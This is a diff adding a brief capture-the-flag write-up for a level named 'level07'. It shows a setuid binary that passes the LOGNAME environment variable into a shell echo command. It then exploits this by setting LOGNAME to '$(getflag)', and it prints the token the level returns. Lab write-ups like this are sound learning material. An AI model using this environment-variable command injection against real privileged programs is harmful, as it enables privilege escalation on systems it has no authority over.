@@ -1,0 +1,22 @@
+-ls -la
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+#Using strings command to return the string characters into the binary file:
+
+- strings level07
+...
+[^_]
+LOGNAME
+/bin/echo %s
+...
+
+#We retrieve the .env variable 'LOGNAME' (which is an env variable that contains the user that executes the current shell process), with asprintf on the string /bin/echo %s to replace %s with the result of LOGNAME.
+Let's put in this variable the getflag cmd
+
+-export LOGNAME=$\(getflag\)
+- ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+
+
+
